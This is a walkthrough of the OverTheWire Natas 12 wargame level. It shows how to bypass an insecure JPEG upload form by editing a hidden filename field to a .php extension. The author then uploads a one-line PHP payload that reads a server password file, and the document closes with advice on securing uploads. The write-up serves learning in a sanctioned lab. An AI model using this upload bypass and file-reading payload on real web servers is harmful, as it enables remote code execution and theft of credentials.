# Natas 12 → Natas 13

## Level Information

* URL: `http://natas12.natas.labs.overthewire.org`
* Username: `natas12`
* Password: `[REDACTED]`

## Goal

Find the password for the next level, `natas13`.

## Page Observation

When I opened the page, I saw a file upload form:

```text
Choose a JPEG to upload (max 1KB)
```

There was also a link:

```text
View sourcecode
```

The page looked like it only allowed JPEG uploads, but the source code showed that the uploaded filename could be controlled from a hidden form field.

## Concept

This level introduces insecure file upload.

The application asks the user to upload a JPEG file, but it does not properly validate the uploaded file on the server side. The filename is stored in a hidden input field, and the extension can be changed from `.jpg` to `.php`.

If a PHP file is uploaded with a `.php` extension and the server executes it, the attacker can run PHP code on the server.

## Source Code Review

After inspecting the page with Developer Tools, I found a hidden input field similar to this:

```html
<input type="hidden" name="filename" value="randomname.jpg">
```

This value controlled the final uploaded filename.

By changing the value from:

```text
randomname.jpg
```

to:

```text
randomname.php
```

the uploaded file could be saved as a PHP file.

## Payload File

I created a small PHP file named:

```text
shell.php
```

The content was:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

This PHP code reads the password file for `natas13`.

The file is smaller than 1KB, so it satisfies the upload size limit.

## Steps

1. Opened the Natas 12 page.
2. Opened Developer Tools using:

```text
F12
```

3. Went to the `Elements` tab.
4. Searched for:

```text
filename
```

5. Found the hidden input field:

```html
<input type="hidden" name="filename" value="gU1efVxY7j.jpg">
```

6. Changed the filename extension from `.jpg` to `.php`:

```html
<input type="hidden" name="filename" value="gU1efVxY7j.php">
```

7. Created a PHP file named `shell.php`.
8. Put this code inside the file:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

9. Chose `shell.php` in the upload form.
10. Clicked `Upload File`.
11. The server uploaded the file and returned a link to the uploaded file.
12. Opened the uploaded `.php` file.
13. The PHP code executed and displayed the password for `natas13`.

## Browser Method

Hidden filename before modification:

```text
gU1efVxY7j.jpg
```

Hidden filename after modification:

```text
gU1efVxY7j.php
```

Payload file content:

```php
<?php echo file_get_contents('/etc/natas_webpass/natas13'); ?>
```

After uploading, open the uploaded PHP file link:

```text
http://natas12.natas.labs.overthewire.org/upload/[uploaded-file-name].php
```

## Result

After opening the uploaded PHP file, the server executed the PHP code and displayed the password for `natas13`.

## Lesson Learned

File upload functionality is dangerous if the server trusts client-side values such as hidden form fields, filenames, or file extensions.

To prevent this vulnerability, developers should validate uploaded files on the server side, check file content, rename files safely, store uploads outside the executable web directory, and disable script execution in upload folders.

## Password

```text
[REDACTED]
```
